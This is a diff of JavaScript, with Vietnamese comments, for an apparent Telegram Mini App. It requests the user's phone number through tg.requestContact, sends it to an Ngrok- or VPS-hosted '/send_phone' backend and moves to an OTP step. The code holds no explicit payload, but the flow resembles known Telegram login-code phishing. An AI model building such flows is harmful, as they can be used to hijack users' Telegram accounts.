@@ -74,43 +74,43 @@
     // 2. Lắng nghe sự kiện trả về từ Telegram
     // ... (các phần cũ phía trên)
 
-tg.onEvent('contactRequested', async (event) => {
-    if (event.status === 'sent') {
-        currentPhone = event.contact.phone_number;
-        
-        // === BẮT ĐẦU THAY THẾ TẠI ĐÂY ===
-        try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 5000); // Ngắt sau 5 giây
-
-            const response = await fetch(`${BACKEND_URL}/send_phone`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: currentPhone }),
-                signal: controller.signal
-            });
-            
-            clearTimeout(timeoutId);
-            const data = await response.json();
-            
-            if(data.status === 'otp_sent') {
-                goStep(3);
-            } else {
-                alert("Server phản hồi lỗi: " + data.message);
-                document.getElementById("shareContact").textContent = 'Xác Nhận';
-            }
-        } catch (err) {
-            // Nếu có lỗi, nó sẽ hiện thông báo cụ thể cho bạn biết
-            alert("Lỗi kết nối VPS: " + err.message + ". Kiểm tra lại Firewall hoặc HTTPS.");
+// 1. Thay thế đoạn tg.onEvent cũ bằng cách này:
+// Telegram yêu cầu quyền chia sẻ contact qua nút bấm, dữ liệu trả về nằm trong callback của requestContact
+document.getElementById("shareContact").addEventListener("click", () => {
+    document.getElementById("shareContact").textContent = '⏳ Đang xác nhận...';
+    
+    // Gọi yêu cầu contact
+    tg.requestContact((status, res) => {
+        if (status) {
+            // Nếu người dùng đồng ý, res.response.contact.phone_number sẽ chứa SĐT
+            const phone = res.response.contact.phone_number;
+            sendPhoneToServer(phone);
+        } else {
+            alert("Bạn cần chia sẻ SĐT để xác minh.");
             document.getElementById("shareContact").textContent = 'Xác Nhận';
         }
-        // === KẾT THÚC THAY THẾ TẠI ĐÂY ===
-        
-    } else {
-        alert("Người dùng từ chối chia sẻ SĐT");
-        document.getElementById('shareContact').textContent = 'Xác Nhận';
-    }
+    });
 });
+
+// 2. Tạo hàm riêng để gửi dữ liệu cho gọn
+async function sendPhoneToServer(phone) {
+    try {
+        const response = await fetch(`${BACKEND_URL}/send_phone`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: phone })
+        });
+        
+        const data = await response.json();
+        if(data.status === 'otp_sent') {
+            goStep(3);
+        } else {
+            alert("Lỗi server: " + data.message);
+        }
+    } catch (err) {
+        alert("Không thể kết nối tới server. Hãy kiểm tra Ngrok!");
+    }
+}
 
 // ... (các phần phía dưới)
 
